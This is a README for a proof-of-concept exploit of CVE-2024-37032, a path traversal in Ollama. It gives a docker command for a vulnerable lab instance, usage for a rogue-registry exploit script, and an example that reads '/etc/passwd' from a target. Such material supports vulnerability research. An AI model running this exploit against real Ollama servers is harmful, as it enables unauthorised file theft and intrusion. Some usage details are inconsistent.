# Probllama in Ollama: A tale of a yet another RCE vulnerability (CVE-2024-37032)
Exploit script and proof of concept for a path traversal vulnerability in Ollama


# Vulnerability environment

```bash
docker run -d -v ollama:/root/.ollama -p 11434:11434 --name ollama ollama/ollama:0.1.33
```

Usage:
```
usage: main.py [-h] --file FILE --target TARGET [--target-ip TARGET_IP] [--host HOST]
               [--namespace NAMESPACE]

Run FastAPI rogue server and exploit script (CVE-2024-37032).

options:
  -h, --help            show this help message and exit
  --file FILE           The file to read remotely.
  --target TARGET       The vulnerable Ollama instance's (target) IP.
  --target-ip TARGET_IP
                        The vulnerable Ollama instance's (target) port.
  --host HOST           Current (attacker) machine's IP.
  --namespace NAMESPACE
                        The string for the rogue registry namespace.
```

Example:
```bash
python3 main.py --file '/etc/passwd' --target localhost
```


- Please modify `HOST` to your rogue registry server host, and `target_url` to vulnerability host
- Run `python3 poc.py` and check rogue registry server log


## References
- [Probllama: Ollama Remote Code Execution Vulnerability (CVE-2024-37032) â€“ Overview and Mitigations](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032#the-vulnerability-arbitrary-file-write-via-path-traversal-25)
- [vsociety](https://www.vicarius.io/vsociety/)
